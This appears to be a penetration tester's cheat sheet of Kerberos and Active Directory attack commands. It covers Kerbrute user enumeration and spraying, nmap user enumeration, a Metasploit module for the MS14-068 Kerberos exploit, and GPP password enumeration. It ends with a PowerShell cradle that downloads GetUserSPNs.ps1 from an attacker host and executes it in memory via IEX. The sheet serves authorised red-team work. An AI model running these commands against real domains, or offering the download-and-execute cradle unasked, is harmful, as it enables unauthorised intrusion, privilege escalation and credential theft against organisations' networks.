# kerberos

% kerberos

## Kerbrute usersenum
#assessment/AD #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
```bash
./kerbrute_linux_amd64 userenum -d <domain> --dc <ip> <users_file>
```

## kerberos enum users
#assessment/AD #target/remote #port/88 #protocol/kerberos #cat/RECON 
```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>'" <ip>
```

## kerberos enum users (with user list)
#assessment/AD #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY
```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
```

## kerberos ms14-068
#assessment/AD #target/remote #port/88 #protocol/kerberos #cat/ATTACK/EXPLOIT 
```bash
msfconsole -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
```

## exploit gpp - group policy preference (ms14-025)
#assessment/AD #target/remote #port/88 #protocol/kerberos #cat/RECON 
```bash
msfconsole -x "use scanner/smb/smb_enum_gpp"
```

## powershell - get user SPN
#assessment/AD #target/remote #port/88 #protocol/kerberos #cat/RECON 

https://github.com/nidem/kerberoast
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/GetUserSPNs.ps1') | IEX
```
